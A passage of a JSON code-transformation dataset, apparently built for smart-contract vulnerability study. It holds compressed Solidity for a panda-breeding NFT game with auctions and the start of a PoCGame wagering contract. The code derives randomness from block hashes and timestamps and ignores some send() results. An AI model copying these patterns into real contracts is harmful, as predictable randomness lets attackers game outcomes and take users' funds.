{\nrequire(_owns(msg.sender, _tokenId));\n_approve(_tokenId, _to);\nApproval(msg.sender, _to, _tokenId);\n}\nfunction transferFrom(\naddress _from,\naddress _to,\nuint256 _tokenId\n)\nexternal\nwhenNotPaused {\nrequire(_to != address(0));\nrequire(_to != address(this));\nrequire(_approvedFor(msg.sender, _tokenId));\nrequire(_owns(_from, _tokenId));\n_transfer(_from, _to, _tokenId);\n}\nfunction totalSupply() public view returns (uint) {\nreturn pandas.length - 1;\n}\nfunction ownerOf(uint256 _tokenId)\nexternal\nview\nreturns (address owner) {\nowner = pandaIndexToOwner[_tokenId];\nrequire(owner != address(0));\n}\nfunction tokensOfOwner(address _owner) external view returns(uint256[] ownerTokens) {\nuint256 tokenCount = balanceOf(_owner);\nif (tokenCount == 0) {\nreturn new uint256[](0);\n} else {\nuint256[] memory result = new uint256[](tokenCount);\nuint256 totalCats = totalSupply();\nuint256 resultIndex = 0;\nuint256 catId;\nfor (catId = 1; catId <= totalCats; catId++) {\nif (pandaIndexToOwner[catId] == _owner) {\nresult[resultIndex] = catId;\nresultIndex++;\n}\n}\nreturn result;\n}\n}\nfunction _memcpy(uint _dest, uint _src, uint _len) private view {\nfor(; _len >= 32; _len -= 32) {\nassembly {\nmstore(_dest, mload(_src))\n}\n_dest += 32;\n_src += 32;\n}\nuint256 mask = 256 ** (32 - _len) - 1;\nassembly {\nlet srcpart := and(mload(_src), not(mask))\nlet destpart := and(mload(_dest), mask)\nmstore(_dest, or(destpart, srcpart))\n}\n}\nfunction _toString(bytes32[4] _rawBytes, uint256 _stringLength) private view returns (string) {\nvar outputString = new string(_stringLength);\nuint256 outputPtr;\nuint256 bytesPtr;\nassembly {\noutputPtr := add(outputString, 32)\nbytesPtr := _rawBytes\n}\n_memcpy(outputPtr, bytesPtr, _stringLength);\nreturn outputString;\n}\n}\ncontract PandaBreeding is PandaOwnership {\nuint256 public constant GENSIS_TOTAL_COUNT = 100;\nevent Pregnant(address owner, uint256 matronId, uint256 sireId, uint256 cooldownEndBlock);\nevent Abortion(address owner, uint256 matronId, uint256 sireId);\nuint256 public autoBirthFee = 2 finney;\nuint256 public pregnantPandas;\nmapping(uint256 => address) childOwner;\nfunction setGeneScienceAddress(address _address) external onlyCEO {\nGeneScienceInterface candidateContract = GeneScienceInterface(_address);\nrequire(candidateContract.isGeneScience());\ngeneScience = candidateContract;\n}\nfunction _isReadyToBreed(Panda _kit) internal view returns(bool) {\nreturn (_kit.siringWithId == 0) && (_kit.cooldownEndBlock <= uint64(block.number));\n}\nfunction _isSiringPermitted(uint256 _sireId, uint256 _matronId) internal view returns(bool) {\naddress matronOwner = pandaIndexToOwner[_matronId];\naddress sireOwner = pandaIndexToOwner[_sireId];\nreturn (matronOwner == sireOwner || sireAllowedToAddress[_sireId] == matronOwner);\n}\nfunction _triggerCooldown(Panda storage _kitten) internal {\n_kitten.cooldownEndBlock = uint64((cooldowns[_kitten.cooldownIndex] / secondsPerBlock) + block.number);\nif (_kitten.cooldownIndex < 8 && geneScience.getWizzType(_kitten.genes) != 1) {\n_kitten.cooldownIndex += 1;\n}\n}\nfunction approveSiring(address _addr, uint256 _sireId)\nexternal\nwhenNotPaused {\nrequire(_owns(msg.sender, _sireId));\nsireAllowedToAddress[_sireId] = _addr;\n}\nfunction setAutoBirthFee(uint256 val) external onlyCOO {\nautoBirthFee = val;\n}\nfunction _isReadyToGiveBirth(Panda _matron) private view returns(bool) {\nreturn (_matron.siringWithId != 0) && (_matron.cooldownEndBlock <= uint64(block.number));\n}\nfunction isReadyToBreed(uint256 _pandaId)\npublic\nview\nreturns(bool) {\nrequire(_pandaId > 0);\nPanda storage kit = pandas[_pandaId];\nreturn _isReadyToBreed(kit);\n}\nfunction isPregnant(uint256 _pandaId)\npublic\nview\nreturns(bool) {\nrequire(_pandaId > 0);\nreturn pandas[_pandaId].siringWithId != 0;\n}\nfunction _isValidMatingPair(\nPanda storage _matron,\nuint256 _matronId,\nPanda storage _sire,\nuint256 _sireId\n)\nprivate\nview\nreturns(bool) {\nif (_matronId == _sireId) {\nreturn false;\n}\nif (_matron.matronId == _sireId || _matron.sireId == _sireId) {\nreturn false;\n}\nif (_sire.matronId == _matronId || _sire.sireId == _matronId) {\nreturn false;\n}\nif (_sire.matronId == 0 || _matron.matronId == 0) {\nreturn true;\n}\nif (_sire.matronId == _matron.matronId || _sire.matronId == _matron.sireId) {\nreturn false;\n}\nif (_sire.sireId == _matron.matronId || _sire.sireId == _matron.sireId) {\nreturn false;\n}\nif (geneScience.getSex(_matron.genes) + geneScience.getSex(_sire.genes) != 1) {\nreturn false;\n}\nreturn true;\n}\nfunction _canBreedWithViaAuction(uint256 _matronId, uint256 _sireId)\ninternal\nview\nreturns(bool) {\nPanda storage matron = pandas[_matronId];\nPanda storage sire = pandas[_sireId];\nreturn _isValidMatingPair(matron, _matronId, sire, _sireId);\n}\nfunction canBreedWith(uint256 _matronId, uint256 _sireId)\nexternal\nview\nreturns(bool) {\nrequire(_matronId > 0);\nrequire(_sireId > 0);\nPanda storage matron = pandas[_matronId];\nPanda storage sire = pandas[_sireId];\nreturn _isValidMatingPair(matron, _matronId, sire, _sireId) &&\n_isSiringPermitted(_sireId, _matronId);\n}\nfunction _exchangeMatronSireId(uint256 _matronId, uint256 _sireId) internal returns(uint256, uint256) {\nif (geneScience.getSex(pandas[_matronId].genes) == 1) {\nreturn (_sireId, _matronId);\n} else {\nreturn (_matronId, _sireId);\n}\n}\nfunction _breedWith(uint256 _matronId, uint256 _sireId, address _owner) internal {\n(_matronId, _sireId) = _exchangeMatronSireId(_matronId, _sireId);\nPanda storage sire = pandas[_sireId];\nPanda storage matron = pandas[_matronId];\nmatron.siringWithId = uint32(_sireId);\n_triggerCooldown(sire);\n_triggerCooldown(matron);\ndelete sireAllowedToAddress[_matronId];\ndelete sireAllowedToAddress[_sireId];\npregnantPandas++;\nchildOwner[_matronId] = _owner;\nPregnant(pandaIndexToOwner[_matronId], _matronId, _sireId, matron.cooldownEndBlock);\n}\nfunction breedWithAuto(uint256 _matronId, uint256 _sireId)\nexternal\npayable\nwhenNotPaused {\nrequire(msg.value >= autoBirthFee);\nrequire(_owns(msg.sender, _matronId));\nrequire(_isSiringPermitted(_sireId, _matronId));\nPanda storage matron = pandas[_matronId];\nrequire(_isReadyToBreed(matron));\nPanda storage sire = pandas[_sireId];\nrequire(_isReadyToBreed(sire));\nrequire(_isValidMatingPair(\nmatron,\n_matronId,\nsire,\n_sireId\n));\n_breedWith(_matronId, _sireId, msg.sender);\n}\nfunction giveBirth(uint256 _matronId, uint256[2] _childGenes, uint256[2] _factors)\nexternal\nwhenNotPaused\nonlyCLevel\nreturns(uint256) {\nPanda storage matron = pandas[_matronId];\nrequire(matron.birthTime != 0);\nrequire(_isReadyToGiveBirth(matron));\nuint256 sireId = matron.siringWithId;\nPanda storage sire = pandas[sireId];\nuint16 parentGen = matron.generation;\nif (sire.generation > matron.generation) {\nparentGen = sire.generation;\n}\nuint256[2] memory childGenes = _childGenes;\nuint256 kittenId = 0;\nuint256 probability = (geneScience.getPureFromGene(matron.genes) + geneScience.getPureFromGene(sire.genes)) / 2 + _factors[0];\nif (probability >= (parentGen + 1) * _factors[1]) {\nprobability = probability - (parentGen + 1) * _factors[1];\n} else {\nprobability = 0;\n}\nif (parentGen == 0 && gen0CreatedCount == GEN0_TOTAL_COUNT) {\nprobability = 0;\n}\nif (uint256(keccak256(block.blockhash(block.number - 2), now)) % 100 < probability) {\naddress owner = childOwner[_matronId];\nkittenId = _createPanda(_matronId, matron.siringWithId, parentGen + 1, childGenes, owner);\n} else {\nAbortion(pandaIndexToOwner[_matronId], _matronId, sireId);\n}\ndelete matron.siringWithId;\npregnantPandas--;\nmsg.sender.send(autoBirthFee);\ndelete childOwner[_matronId];\nreturn kittenId;\n}\n}\ncontract ClockAuctionBase {\nstruct Auction {\naddress seller;\nuint128 startingPrice;\nuint128 endingPrice;\nuint64 duration;\nuint64 startedAt;\nuint64 isGen0;\n}\nERC721 public nonFungibleContract;\nuint256 public ownerCut;\nmapping (uint256 => Auction) tokenIdToAuction;\nevent AuctionCreated(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration);\nevent AuctionSuccessful(uint256 tokenId, uint256 totalPrice, address winner);\nevent AuctionCancelled(uint256 tokenId);\nfunction _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {\nreturn (nonFungibleContract.ownerOf(_tokenId) == _claimant);\n}\nfunction _escrow(address _owner, uint256 _tokenId) internal {\nnonFungibleContract.transferFrom(_owner, this, _tokenId);\n}\nfunction _transfer(address _receiver, uint256 _tokenId) internal {\nnonFungibleContract.transfer(_receiver, _tokenId);\n}\nfunction _addAuction(uint256 _tokenId, Auction _auction) internal {\nrequire(_auction.duration >= 1 minutes);\ntokenIdToAuction[_tokenId] = _auction;\nAuctionCreated(\nuint256(_tokenId),\nuint256(_auction.startingPrice),\nuint256(_auction.endingPrice),\nuint256(_auction.duration)\n);\n}\nfunction _cancelAuction(uint256 _tokenId, address _seller) internal {\n_removeAuction(_tokenId);\n_transfer(_seller, _tokenId);\nAuctionCancelled(_tokenId);\n}\nfunction _bid(uint256 _tokenId, uint256 _bidAmount)\ninternal\nreturns (uint256) {\nAuction storage auction = tokenIdToAuction[_tokenId];\nrequire(_isOnAuction(auction));\nuint256 price = _currentPrice(auction);\nrequire(_bidAmount >= price);\naddress seller = auction.seller;\n_removeAuction(_tokenId);\nif (price > 0) {\nuint256 auctioneerCut = _computeCut(price);\nuint256 sellerProceeds = price - auctioneerCut;\nseller.transfer(sellerProceeds);\n}\nuint256 bidExcess = _bidAmount - price;\nmsg.sender.transfer(bidExcess);\nAuctionSuccessful(_tokenId, price, msg.sender);\nreturn price;\n}\nfunction _removeAuction(uint256 _tokenId) internal {\ndelete tokenIdToAuction[_tokenId];\n}\nfunction _isOnAuction(Auction storage _auction) internal view returns (bool) {\nreturn (_auction.startedAt > 0);\n}\nfunction _currentPrice(Auction storage _auction)\ninternal\nview\nreturns (uint256) {\nuint256 secondsPassed = 0;\nif (now > _auction.startedAt) {\nsecondsPassed = now - _auction.startedAt;\n}\nreturn _computeCurrentPrice(\n_auction.startingPrice,\n_auction.endingPrice,\n_auction.duration,\nsecondsPassed\n);\n}\nfunction _computeCurrentPrice(\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration,\nuint256 _secondsPassed\n)\ninternal\npure\nreturns (uint256) {\nif (_secondsPassed >= _duration) {\nreturn _endingPrice;\n} else {\nint256 totalPriceChange = int256(_endingPrice) - int256(_startingPrice);\nint256 currentPriceChange = totalPriceChange * int256(_secondsPassed) / int256(_duration);\nint256 currentPrice = int256(_startingPrice) + currentPriceChange;\nreturn uint256(currentPrice);\n}\n}\nfunction _computeCut(uint256 _price) internal view returns (uint256) {\nreturn _price * ownerCut / 10000;\n}\n}\ncontract Pausable is Ownable {\nevent Pause();\nevent Unpause();\nbool public paused = false;\nmodifier whenNotPaused() {\nrequire(!paused);\n_;\n}\nmodifier whenPaused {\nrequire(paused);\n_;\n}\nfunction pause() onlyOwner whenNotPaused returns (bool) {\npaused = true;\nPause();\nreturn true;\n}\nfunction unpause() onlyOwner whenPaused returns (bool) {\npaused = false;\nUnpause();\nreturn true;\n}\n}\ncontract ClockAuction is Pausable, ClockAuctionBase {\nbytes4 constant InterfaceSignature_ERC721 = bytes4(0x9a20483d);\nfunction ClockAuction(address _nftAddress, uint256 _cut) public {\nrequire(_cut <= 10000);\nownerCut = _cut;\nERC721 candidateContract = ERC721(_nftAddress);\nrequire(candidateContract.supportsInterface(InterfaceSignature_ERC721));\nnonFungibleContract = candidateContract;\n}\nfunction withdrawBalance() external {\naddress nftAddress = address(nonFungibleContract);\nrequire(\nmsg.sender == owner ||\nmsg.sender == nftAddress\n);\nbool res = nftAddress.send(this.balance);\n}\nfunction createAuction(\nuint256 _tokenId,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration,\naddress _seller\n)\nexternal\nwhenNotPaused {\nrequire(_startingPrice == uint256(uint128(_startingPrice)));\nrequire(_endingPrice == uint256(uint128(_endingPrice)));\nrequire(_duration == uint256(uint64(_duration)));\nrequire(_owns(msg.sender, _tokenId));\n_escrow(msg.sender, _tokenId);\nAuction memory auction = Auction(\n_seller,\nuint128(_startingPrice),\nuint128(_endingPrice),\nuint64(_duration),\nuint64(now),\n0\n);\n_addAuction(_tokenId, auction);\n}\nfunction bid(uint256 _tokenId)\nexternal\npayable\nwhenNotPaused {\n_bid(_tokenId, msg.value);\n_transfer(msg.sender, _tokenId);\n}\nfunction cancelAuction(uint256 _tokenId)\nexternal {\nAuction storage auction = tokenIdToAuction[_tokenId];\nrequire(_isOnAuction(auction));\naddress seller = auction.seller;\nrequire(msg.sender == seller);\n_cancelAuction(_tokenId, seller);\n}\nfunction cancelAuctionWhenPaused(uint256 _tokenId)\nwhenPaused\nonlyOwner\nexternal {\nAuction storage auction = tokenIdToAuction[_tokenId];\nrequire(_isOnAuction(auction));\n_cancelAuction(_tokenId, auction.seller);\n}\nfunction getAuction(uint256 _tokenId)\nexternal\nview\nreturns\n(\naddress seller,\nuint256 startingPrice,\nuint256 endingPrice,\nuint256 duration,\nuint256 startedAt\n) {\nAuction storage auction = tokenIdToAuction[_tokenId];\nrequire(_isOnAuction(auction));\nreturn (\nauction.seller,\nauction.startingPrice,\nauction.endingPrice,\nauction.duration,\nauction.startedAt\n);\n}\nfunction getCurrentPrice(uint256 _tokenId)\nexternal\nview\nreturns (uint256) {\nAuction storage auction = tokenIdToAuction[_tokenId];\nrequire(_isOnAuction(auction));\nreturn _currentPrice(auction);\n}\n}\ncontract SiringClockAuction is ClockAuction {\nbool public isSiringClockAuction = true;\nfunction SiringClockAuction(address _nftAddr, uint256 _cut) public\nClockAuction(_nftAddr, _cut) {}\nfunction createAuction(\nuint256 _tokenId,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration,\naddress _seller\n)\nexternal {\nrequire(_startingPrice == uint256(uint128(_startingPrice)));\nrequire(_endingPrice == uint256(uint128(_endingPrice)));\nrequire(_duration == uint256(uint64(_duration)));\nrequire(msg.sender == address(nonFungibleContract));\n_escrow(_seller, _tokenId);\nAuction memory auction = Auction(\n_seller,\nuint128(_startingPrice),\nuint128(_endingPrice),\nuint64(_duration),\nuint64(now),\n0\n);\n_addAuction(_tokenId, auction);\n}\nfunction bid(uint256 _tokenId)\nexternal\npayable {\nrequire(msg.sender == address(nonFungibleContract));\naddress seller = tokenIdToAuction[_tokenId].seller;\n_bid(_tokenId, msg.value);\n_transfer(seller, _tokenId);\n}\n}\ncontract SaleClockAuction is ClockAuction {\nbool public isSaleClockAuction = true;\nuint256 public gen0SaleCount;\nuint256[5] public lastGen0SalePrices;\nuint256 public constant SurpriseValue = 10 finney;\nuint256[] CommonPanda;\nuint256[] RarePanda;\nuint256 CommonPandaIndex;\nuint256 RarePandaIndex;\nfunction SaleClockAuction(address _nftAddr, uint256 _cut) public\nClockAuction(_nftAddr, _cut) {\nCommonPandaIndex = 1;\nRarePandaIndex = 1;\n}\nfunction createAuction(\nuint256 _tokenId,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration,\naddress _seller\n)\nexternal {\nrequire(_startingPrice == uint256(uint128(_startingPrice)));\nrequire(_endingPrice == uint256(uint128(_endingPrice)));\nrequire(_duration == uint256(uint64(_duration)));\nrequire(msg.sender == address(nonFungibleContract));\n_escrow(_seller, _tokenId);\nAuction memory auction = Auction(\n_seller,\nuint128(_startingPrice),\nuint128(_endingPrice),\nuint64(_duration),\nuint64(now),\n0\n);\n_addAuction(_tokenId, auction);\n}\nfunction createGen0Auction(\nuint256 _tokenId,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration,\naddress _seller\n)\nexternal {\nrequire(_startingPrice == uint256(uint128(_startingPrice)));\nrequire(_endingPrice == uint256(uint128(_endingPrice)));\nrequire(_duration == uint256(uint64(_duration)));\nrequire(msg.sender == address(nonFungibleContract));\n_escrow(_seller, _tokenId);\nAuction memory auction = Auction(\n_seller,\nuint128(_startingPrice),\nuint128(_endingPrice),\nuint64(_duration),\nuint64(now),\n1\n);\n_addAuction(_tokenId, auction);\n}\nfunction bid(uint256 _tokenId)\nexternal\npayable {\nuint64 isGen0 = tokenIdToAuction[_tokenId].isGen0;\nuint256 price = _bid(_tokenId, msg.value);\n_transfer(msg.sender, _tokenId);\nif (isGen0 == 1) {\nlastGen0SalePrices[gen0SaleCount % 5] = price;\ngen0SaleCount++;\n}\n}\nfunction createPanda(uint256 _tokenId,uint256 _type)\nexternal {\nrequire(msg.sender == address(nonFungibleContract));\nif (_type == 0) {\nCommonPanda.push(_tokenId);\n}else {\nRarePanda.push(_tokenId);\n}\n}\nfunction surprisePanda()\nexternal\npayable {\nbytes32 bHash = keccak256(block.blockhash(block.number),block.blockhash(block.number-1));\nuint256 PandaIndex;\nif (bHash[25] > 0xC8) {\nrequire(uint256(RarePanda.length) >= RarePandaIndex);\nPandaIndex = RarePandaIndex;\nRarePandaIndex ++;\n} else{\nrequire(uint256(CommonPanda.length) >= CommonPandaIndex);\nPandaIndex = CommonPandaIndex;\nCommonPandaIndex ++;\n}\n_transfer(msg.sender,PandaIndex);\n}\nfunction packageCount() external view returns(uint256 common,uint256 surprise) {\ncommon = CommonPanda.length + 1 - CommonPandaIndex;\nsurprise = RarePanda.length + 1 - RarePandaIndex;\n}\nfunction averageGen0SalePrice() external view returns (uint256) {\nuint256 sum = 0;\nfor (uint256 i = 0; i < 5; i++) {\nsum += lastGen0SalePrices[i];\n}\nreturn sum / 5;\n}\n}\ncontract SaleClockAuctionERC20 is ClockAuction {\nevent AuctionERC20Created(uint256 tokenId, uint256 startingPrice, uint256 endingPrice, uint256 duration, address erc20Contract);\nbool public isSaleClockAuctionERC20 = true;\nmapping (uint256 => address) public tokenIdToErc20Address;\nmapping (address => uint256) public erc20ContractsSwitcher;\nmapping (address => uint256) public balances;\nfunction SaleClockAuctionERC20(address _nftAddr, uint256 _cut) public\nClockAuction(_nftAddr, _cut) {}\nfunction erc20ContractSwitch(address _erc20address, uint256 _onoff) external{\nrequire (msg.sender == address(nonFungibleContract));\nrequire (_erc20address != address(0));\nerc20ContractsSwitcher[_erc20address] = _onoff;\n}\nfunction createAuction(\nuint256 _tokenId,\naddress _erc20Address,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration,\naddress _seller\n)\nexternal {\nrequire(_startingPrice == uint256(uint128(_startingPrice)));\nrequire(_endingPrice == uint256(uint128(_endingPrice)));\nrequire(_duration == uint256(uint64(_duration)));\nrequire(msg.sender == address(nonFungibleContract));\nrequire (erc20ContractsSwitcher[_erc20Address] > 0);\n_escrow(_seller, _tokenId);\nAuction memory auction = Auction(\n_seller,\nuint128(_startingPrice),\nuint128(_endingPrice),\nuint64(_duration),\nuint64(now),\n0\n);\n_addAuctionERC20(_tokenId, auction, _erc20Address);\ntokenIdToErc20Address[_tokenId] = _erc20Address;\n}\nfunction _addAuctionERC20(uint256 _tokenId, Auction _auction, address _erc20address) internal {\nrequire(_auction.duration >= 1 minutes);\ntokenIdToAuction[_tokenId] = _auction;\nAuctionERC20Created(\nuint256(_tokenId),\nuint256(_auction.startingPrice),\nuint256(_auction.endingPrice),\nuint256(_auction.duration),\n_erc20address\n);\n}\nfunction bid(uint256 _tokenId)\nexternal\npayable{\n}\nfunction bidERC20(uint256 _tokenId,uint256 _amount)\nexternal {\naddress seller = tokenIdToAuction[_tokenId].seller;\naddress _erc20address = tokenIdToErc20Address[_tokenId];\nrequire (_erc20address != address(0));\nuint256 price = _bidERC20(_erc20address,msg.sender,_tokenId, _amount);\n_transfer(msg.sender, _tokenId);\ndelete tokenIdToErc20Address[_tokenId];\n}\nfunction cancelAuction(uint256 _tokenId)\nexternal {\nAuction storage auction = tokenIdToAuction[_tokenId];\nrequire(_isOnAuction(auction));\naddress seller = auction.seller;\nrequire(msg.sender == seller);\n_cancelAuction(_tokenId, seller);\ndelete tokenIdToErc20Address[_tokenId];\n}\nfunction withdrawERC20Balance(address _erc20Address, address _to) external returns(bool res) {\nrequire (balances[_erc20Address] > 0);\nrequire(msg.sender == address(nonFungibleContract));\nERC20(_erc20Address).transfer(_to, balances[_erc20Address]);\n}\nfunction _bidERC20(address _erc20Address,address _buyerAddress, uint256 _tokenId, uint256 _bidAmount)\ninternal\nreturns (uint256) {\nAuction storage auction = tokenIdToAuction[_tokenId];\nrequire(_isOnAuction(auction));\nrequire (_erc20Address != address(0) && _erc20Address == tokenIdToErc20Address[_tokenId]);\nuint256 price = _currentPrice(auction);\nrequire(_bidAmount >= price);\naddress seller = auction.seller;\n_removeAuction(_tokenId);\nif (price > 0) {\nuint256 auctioneerCut = _computeCut(price);\nuint256 sellerProceeds = price - auctioneerCut;\nrequire(ERC20(_erc20Address).transferFrom(_buyerAddress,seller,sellerProceeds));\nif (auctioneerCut > 0){\nrequire(ERC20(_erc20Address).transferFrom(_buyerAddress,address(this),auctioneerCut));\nbalances[_erc20Address] += auctioneerCut;\n}\n}\nAuctionSuccessful(_tokenId, price, msg.sender);\nreturn price;\n}\n}\ncontract PandaAuction is PandaBreeding {\nfunction setSaleAuctionAddress(address _address) external onlyCEO {\nSaleClockAuction candidateContract = SaleClockAuction(_address);\nrequire(candidateContract.isSaleClockAuction());\nsaleAuction = candidateContract;\n}\nfunction setSaleAuctionERC20Address(address _address) external onlyCEO {\nSaleClockAuctionERC20 candidateContract = SaleClockAuctionERC20(_address);\nrequire(candidateContract.isSaleClockAuctionERC20());\nsaleAuctionERC20 = candidateContract;\n}\nfunction setSiringAuctionAddress(address _address) external onlyCEO {\nSiringClockAuction candidateContract = SiringClockAuction(_address);\nrequire(candidateContract.isSiringClockAuction());\nsiringAuction = candidateContract;\n}\nfunction createSaleAuction(\nuint256 _pandaId,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration\n)\nexternal\nwhenNotPaused {\nrequire(_owns(msg.sender, _pandaId));\nrequire(!isPregnant(_pandaId));\n_approve(_pandaId, saleAuction);\nsaleAuction.createAuction(\n_pandaId,\n_startingPrice,\n_endingPrice,\n_duration,\nmsg.sender\n);\n}\nfunction createSaleAuctionERC20(\nuint256 _pandaId,\naddress _erc20address,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration\n)\nexternal\nwhenNotPaused {\nrequire(_owns(msg.sender, _pandaId));\nrequire(!isPregnant(_pandaId));\n_approve(_pandaId, saleAuctionERC20);\nsaleAuctionERC20.createAuction(\n_pandaId,\n_erc20address,\n_startingPrice,\n_endingPrice,\n_duration,\nmsg.sender\n);\n}\nfunction switchSaleAuctionERC20For(address _erc20address, uint256 _onoff) external onlyCOO{\nsaleAuctionERC20.erc20ContractSwitch(_erc20address,_onoff);\n}\nfunction createSiringAuction(\nuint256 _pandaId,\nuint256 _startingPrice,\nuint256 _endingPrice,\nuint256 _duration\n)\nexternal\nwhenNotPaused {\nrequire(_owns(msg.sender, _pandaId));\nrequire(isReadyToBreed(_pandaId));\n_approve(_pandaId, siringAuction);\nsiringAuction.createAuction(\n_pandaId,\n_startingPrice,\n_endingPrice,\n_duration,\nmsg.sender\n);\n}\nfunction bidOnSiringAuction(\nuint256 _sireId,\nuint256 _matronId\n)\nexternal\npayable\nwhenNotPaused {\nrequire(_owns(msg.sender, _matronId));\nrequire(isReadyToBreed(_matronId));\nrequire(_canBreedWithViaAuction(_matronId, _sireId));\nuint256 currentPrice = siringAuction.getCurrentPrice(_sireId);\nrequire(msg.value >= currentPrice + autoBirthFee);\nsiringAuction.bid.value(msg.value - autoBirthFee)(_sireId);\n_breedWith(uint32(_matronId), uint32(_sireId), msg.sender);\n}\nfunction withdrawAuctionBalances() external onlyCLevel {\nsaleAuction.withdrawBalance();\nsiringAuction.withdrawBalance();\n}\nfunction withdrawERC20Balance(address _erc20Address, address _to) external onlyCLevel {\nrequire(saleAuctionERC20 != address(0));\nsaleAuctionERC20.withdrawERC20Balance(_erc20Address,_to);\n}\n}\ncontract PandaMinting is PandaAuction {\nuint256 public constant GEN0_CREATION_LIMIT = 45000;\nuint256 public constant GEN0_STARTING_PRICE = 100 finney;\nuint256 public constant GEN0_AUCTION_DURATION = 1 days;\nuint256 public constant OPEN_PACKAGE_PRICE = 10 finney;\nfunction createWizzPanda(uint256[2] _genes, uint256 _generation, address _owner) external onlyCOO {\naddress pandaOwner = _owner;\nif (pandaOwner == address(0)) {\npandaOwner = cooAddress;\n}\n_createPanda(0, 0, _generation, _genes, pandaOwner);\n}\nfunction createPanda(uint256[2] _genes,uint256 _generation,uint256 _type)\nexternal\npayable\nonlyCOO\nwhenNotPaused {\nrequire(msg.value >= OPEN_PACKAGE_PRICE);\nuint256 kittenId = _createPanda(0, 0, _generation, _genes, saleAuction);\nsaleAuction.createPanda(kittenId,_type);\n}\nfunction createGen0Auction(uint256 _pandaId) external onlyCOO {\nrequire(_owns(msg.sender, _pandaId));\n_approve(_pandaId, saleAuction);\nsaleAuction.createGen0Auction(\n_pandaId,\n_computeNextGen0Price(),\n0,\nGEN0_AUCTION_DURATION,\nmsg.sender\n);\n}\nfunction _computeNextGen0Price() internal view returns(uint256) {\nuint256 avePrice = saleAuction.averageGen0SalePrice();\nrequire(avePrice == uint256(uint128(avePrice)));\nuint256 nextPrice = avePrice + (avePrice / 2);\nif (nextPrice < GEN0_STARTING_PRICE) {\nnextPrice = GEN0_STARTING_PRICE;\n}\nreturn nextPrice;\n}\n}\ncontract PandaCore is PandaMinting {\naddress public newContractAddress;\nfunction PandaCore() public {\npaused = true;\nceoAddress = msg.sender;\ncooAddress = msg.sender;\n}\nfunction init() external onlyCEO whenPaused {\nrequire(pandas.length == 0);\nuint256[2] memory _genes = [uint256(-1),uint256(-1)];\nwizzPandaQuota[1] = 100;\n_createPanda(0, 0, 0, _genes, address(0));\n}\nfunction setNewAddress(address _v2Address) external onlyCEO whenPaused {\nnewContractAddress = _v2Address;\nContractUpgrade(_v2Address);\n}\nfunction() external payable {\nrequire(\nmsg.sender == address(saleAuction) ||\nmsg.sender == address(siringAuction)\n);\n}\nfunction getPanda(uint256 _id)\nexternal\nview\nreturns (\nbool isGestating,\nbool isReady,\nuint256 cooldownIndex,\nuint256 nextActionAt,\nuint256 siringWithId,\nuint256 birthTime,\nuint256 matronId,\nuint256 sireId,\nuint256 generation,\nuint256[2] genes\n) {\nPanda storage kit = pandas[_id];\nisGestating = (kit.siringWithId != 0);\nisReady = (kit.cooldownEndBlock <= block.number);\ncooldownIndex = uint256(kit.cooldownIndex);\nnextActionAt = uint256(kit.cooldownEndBlock);\nsiringWithId = uint256(kit.siringWithId);\nbirthTime = uint256(kit.birthTime);\nmatronId = uint256(kit.matronId);\nsireId = uint256(kit.sireId);\ngeneration = uint256(kit.generation);\ngenes = kit.genes;\n}\nfunction unpause() public onlyCEO whenPaused {\nrequire(saleAuction != address(0));\nrequire(siringAuction != address(0));\nrequire(geneScience != address(0));\nrequire(newContractAddress == address(0));\nsuper.unpause();\n}\nfunction withdrawBalance() external onlyCFO {\nuint256 balance = this.balance;\nuint256 subtractFees = (pregnantPandas + 1) * autoBirthFee;\nif (balance > subtractFees) {\ncfoAddress.send(balance - subtractFees);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 402,
        "mode": "compressed",
        "original_lines": 2360,
        "transformed_lines": 1224,
        "original_chars": 94136,
        "transformed_chars": 35117,
        "compression_ratio": 0.37
      },
      "error": null
    },
    {
      "original_id": "sn_ds_215",
      "transformed_id": "ss_l1_compressed_sn_ds_215",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract PoCGame {\nmodifier onlyOwner() {\nrequire(msg.sender == owner);\n_;\n}\nmodifier isOpenToPublic() {\nrequire(openToPublic);\n_;\n}\nmodifier onlyRealPeople() {\nrequire (msg.sender == tx.origin);\n_;\n}\nmodifier onlyPlayers() {\nrequire (wagers[msg.sender] > 0);\n_;\n}\nevent Wager(uint256 amount, address depositer);\nevent Win(uint256 amount, address paidTo);\nevent Lose(uint256 amount, address loser);\nevent Donate(uint256 amount, address paidTo, address donator);\nevent DifficultyChanged(uint256 currentDifficulty);\nevent BetLimitChanged(uint256 currentBetLimit);\naddress private whale;\nuint256 betLimit;\nuint difficulty;\nuint private randomSeed;\naddress owner;\nmapping(address => uint256) timestamps;\nmapping(address => uint256) wagers;\nbool openToPublic;\nuint256 totalDonated;\nconstructor(address whaleAddress, uint256 wagerLimit)\nonlyRealPeople()\npublic {\nopenToPublic = false;\nowner = msg.sender;\nwhale = whaleAddress;\ntotalDonated = 0;\nbetLimit = wagerLimit;\n}\nfunction OpenToThePublic()\nonlyOwner()\npublic {\nopenToPublic = true;\n}\nfunction AdjustBetAmounts(uint256 amount)\nonlyOwner()\npublic {\nbetLimit = amount;\nemit BetLimitChanged(betLimit);\n}\nfunction AdjustDifficulty(uint256 amount)\nonlyOwner()\npublic {\ndifficulty = amount;\nemit DifficultyChanged(difficulty);\n}\nfunction() public payable { }\nfunction wager()\nisOpenToPublic()\nonlyRealPeople()\npayable\npublic {\nrequire(msg.value == betLimit);\ntimestamps[msg.sender] = block.number;\nwagers[msg.sender] = msg.value;\nemit Wager(msg.value, msg.sender);\n}\nfunction play()\nisOpenToPublic()\nonlyRealPeople()\nonlyPlayers()\npublic {\nuint256 blockNumber = timestamps[msg.sender];\nif(blockNumber < block.number) {\ntimestamps[msg.sender] = 0;\nwagers[msg.sender] = 0;\nuint256 winningNumber = 